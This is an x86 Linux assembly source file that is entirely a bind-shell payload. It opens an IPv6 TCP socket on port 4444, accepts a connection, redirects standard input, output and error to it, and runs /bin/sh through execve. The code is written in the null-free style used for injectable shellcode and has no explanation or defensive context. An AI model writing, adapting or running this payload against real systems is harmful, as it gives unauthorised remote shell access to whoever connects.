global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0xa
	mov ecx, esp
	int 0x80

	mov edi, eax

	;bind
	xor eax, eax
	push eax
	push eax
	push eax
	push eax
	push eax
	push word 0x5c11
	push word 0xa
	mov edx, esp

	mov al, 0x66
	inc ebx
	push 0x1c
	push edx
	push edi
	mov ecx, esp

	int 0x80


	;listen
	xor eax, eax
	mov al, 0x66
	mov bl, 4
	push eax
	push edi
	mov ecx, esp
	int 0x80

	;accept
	mov al, 0x66
	inc ebx
	xor ecx, ecx
	push ecx
	push ecx
	push edi
	mov ecx, esp
	int 0x80

	xchg   ebx,eax
	
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx,
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	cdq
	int 0x80
